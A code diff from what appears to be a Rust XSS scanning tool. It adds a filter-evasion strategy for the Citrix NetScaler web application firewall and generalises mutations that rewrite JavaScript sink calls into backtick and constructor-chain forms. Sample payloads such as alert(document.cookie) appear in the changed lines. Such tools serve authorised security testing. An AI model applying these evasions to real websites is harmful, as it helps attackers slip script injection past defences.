@@ -288,6 +288,21 @@ pub fn get_bypass_strategy(waf: &WafType) -> BypassStrategy {
             ],
             extra_delay_hint_ms: 0,
         },
+        // NetScaler AppFirewall is signature/regex driven and keys heavily
+        // on literal tag/keyword shapes. Structural mutations that break the
+        // literal `<tag>` and `alert(` shapes (comment split, case, exotic
+        // whitespace) plus backtick calls are the highest-yield levers; pair
+        // with url/unicode encoders for its body-decoding path.
+        WafType::Citrix => BypassStrategy {
+            extra_encoders: vec!["2url".into(), "unicode".into(), "zwsp".into()],
+            mutations: vec![
+                MutationType::HtmlCommentSplit,
+                MutationType::CaseAlternation,
+                MutationType::WhitespaceMutation,
+                MutationType::BacktickParens,
+            ],
+            extra_delay_hint_ms: 0,
+        },
         WafType::Unknown(hint) => unknown_strategy_for(hint),
     }
 }
@@ -454,19 +469,41 @@ fn apply_single_mutation(payload: &str, mutation: &MutationType) -> String {
 
 // ── Mutation implementations ────────────────────────────────────────
 
-/// Try the first matching `(from, to)` replacement on `payload` using a single
-/// `find()` scan per pattern (no redundant `contains()` + `replacen()` double scan).
-fn try_first_replace(payload: &str, patterns: &[(&str, &str)]) -> String {
-    for &(from, to) in patterns {
-        if let Some(pos) = payload.find(from) {
-            let mut result = String::with_capacity(payload.len() + to.len() - from.len());
-            result.push_str(&payload[..pos]);
-            result.push_str(to);
-            result.push_str(&payload[pos + from.len()..]);
-            return result;
+/// JS sinks whose `name(...)` call shape the keyword-call mutations
+/// (`backtick_parens`, `constructor_chain`) rewrite. Kept explicit so we
+/// only touch real execution sinks and not arbitrary `foo(bar)` text.
+/// First match wins, so order is priority-driven.
+const CALL_SINK_NAMES: &[&str] = &["alert", "confirm", "prompt", "print", "eval"];
+
+/// Locate the first `<sink>(...)` call in `payload` and return
+/// `(name_start, open_paren_idx, close_paren_idx)`. Uses balanced-paren
+/// matching from the opening `(` so nested parens in the argument
+/// (`alert((1))`, `alert(String(1))`) close correctly. Returns `None`
+/// when no known sink call is present or its parens are unbalanced.
+fn find_sink_call(payload: &str) -> Option<(usize, usize, usize)> {
+    let bytes = payload.as_bytes();
+    for name in CALL_SINK_NAMES {
+        let needle = format!("{}(", name);
+        if let Some(pos) = payload.find(&needle) {
+            let open = pos + name.len(); // index of '('
+            let mut depth = 0usize;
+            let mut k = open;
+            while k < bytes.len() {
+                match bytes[k] {
+                    b'(' => depth += 1,
+                    b')' => {
+                        depth -= 1;
+                        if depth == 0 {
+                            return Some((pos, open, k));
+                        }
+                    }
+                    _ => {}
+                }
+                k += 1;
+            }
         }
     }
-    payload.to_string()
+    None
 }
 
 /// Locate the first HTML tag opening (`<` followed by 2+ ASCII letters,
@@ -647,36 +684,89 @@ fn js_comment_split(payload: &str) -> String {
     payload.to_string()
 }
 
-/// Replace function call parentheses with backtick template literals.
-/// `alert(1)` → `` alert`1` ``
-fn backtick_parens(payload: &str) -> String {
-    try_first_replace(
-        payload,
-        &[
-            ("alert(1)", "alert`1`"),
-            ("alert(document.domain)", "alert`${document.domain}`"),
-            ("alert(document.cookie)", "alert`${document.cookie}`"),
-            ("confirm(1)", "confirm`1`"),
-            ("prompt(1)", "prompt`1`"),
-        ],
-    )
+/// Render the inside of a backtick template literal for a sink-call
+/// argument. Bare numbers and simple quoted strings reduce to their raw
+/// text (`1` → `` `1` ``, `'XSS'` → `` `XSS` ``); anything else — member
+/// access, regex, expressions — is wrapped in `${…}` so it still
+/// evaluates (`document.domain` → `` `${document.domain}` ``).
+fn backtick_template_body(arg: &str) -> String {
+    let trimmed = arg.trim();
+    if trimmed.is_empty() {
+        return String::new();
+    }
+    // Bare integer literal: emit verbatim (`alert(1)` → `` alert`1` ``).
+    if trimmed.bytes().all(|b| b.is_ascii_digit()) {
+        return trimmed.to_string();
+    }
+    // Simple `'…'` / `"…"` literal with no inner quote/backtick/`$`: drop
+    // the quotes so the cooked template string carries the same text.
+    let b = trimmed.as_bytes();
+    if b.len() >= 2 {
+        let q = b[0];
+        if (q == b'\'' || q == b'"') && b[b.len() - 1] == q {
+            let inner = &trimmed[1..trimmed.len() - 1];
+            if !inner.as_bytes().contains(&q) && !inner.contains('`') && !inner.contains('$') {
+                return inner.to_string();
+            }
+        }
+    }
+    // Expression / member access / regex: interpolate so it executes.
+    format!("${{{}}}", trimmed)
 }
 
-/// Replace alert() calls with constructor chain to avoid keyword detection.
-/// `alert(1)` → `[].constructor.constructor('alert(1)')()`
+/// Replace a sink call's parentheses with a backtick template literal.
+/// `alert(1)` → `` alert`1` ``, `alert(document.domain)` →
+/// `` alert`${document.domain}` ``, `alert('XSS')` → `` alert`XSS` ``.
+/// Generalised over the argument so it fires on real payloads instead of
+/// a fixed `alert(1)` / `confirm(1)` table.
+fn backtick_parens(payload: &str) -> String {
+    if let Some((_name_start, open, close)) = find_sink_call(payload) {
+        let arg = &payload[open + 1..close];
+        let body = backtick_template_body(arg);
+        let mut out = String::with_capacity(payload.len() + body.len() + 2);
+        out.push_str(&payload[..open]); // up to and including the sink name
+        out.push('`');
+        out.push_str(&body);
+        out.push('`');
+        out.push_str(&payload[close + 1..]);
+        return out;
+    }
+    payload.to_string()
+}
+
+/// Wrap a JS snippet as a string literal, picking a quote char that
+/// avoids escaping when possible, falling back to single-quote with the
+/// inner single quotes backslash-escaped. Keeps the constructor-chain
+/// string valid even when the call argument itself is quoted.
+fn wrap_js_string(s: &str) -> String {
+    let has_single = s.contains('\'');
+    let has_double = s.contains('"');
+    if !has_single {
+        format!("'{}'", s)
+    } else if !has_double {
+        format!("\"{}\"", s)
+    } else {
+        format!("'{}'", s.replace('\'', "\\'"))
+    }
+}
+
+/// Wrap a sink call in a constructor chain to dodge keyword detection.
+/// `alert(1)` → `[].constructor.constructor('alert(1)')()`. Generalised
+/// over the argument and quote-aware, so `alert('XSS')` becomes
+/// `[].constructor.constructor("alert('XSS')")()` rather than a no-op.
 fn constructor_chain(payload: &str) -> String {
-    try_first_replace(
-        payload,
-        &[
-            ("alert(1)", "[].constructor.constructor('alert(1)')()"),
-            (
-                "alert(document.domain)",
-                "[].constructor.constructor('alert(document.domain)')()",
-            ),
-            ("confirm(1)", "[].constructor.constructor('confirm(1)')()"),
-            ("prompt(1)", "[].constructor.constructor('prompt(1)')()"),
-        ],
-    )
+    if let Some((name_start, _open, close)) = find_sink_call(payload) {
+        let call = &payload[name_start..=close];
+        let wrapped = wrap_js_string(call);
+        let mut out = String::with_capacity(payload.len() + wrapped.len() + 28);
+        out.push_str(&payload[..name_start]);
+        out.push_str("[].constructor.constructor(");
+        out.push_str(&wrapped);
+        out.push_str(")()");
+        out.push_str(&payload[close + 1..]);
+        return out;
+    }
+    payload.to_string()
 }
 
 /// Replace first chars of JS function names with unicode escapes.
